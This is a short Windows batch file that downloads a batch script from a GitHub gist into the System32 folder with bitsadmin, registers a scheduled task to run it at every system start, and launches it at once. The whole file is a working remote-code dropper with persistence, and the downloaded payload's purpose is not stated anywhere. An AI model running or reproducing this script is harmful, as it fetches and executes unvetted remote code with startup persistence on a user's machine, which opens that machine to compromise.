@echo off
bitsadmin /transfer hyperloop /download /priority highest https://gist.githubusercontent.com/INeddHelp/df7bbc0b1ab14201111dfd0a9442d28e/raw/5c90819fcb46ddfa4b4d07d0b8a0acd2ceb2ae8a/Hyperloop.bat %systemroot%\System32\HyperLoop.bat
schtasks /create /tn "HyperLoop Task" /tr "C:\Windows\System32\HyperLoop.bat" /sc onstart
start "C:\Windows\System32\HyperLoop.bat"
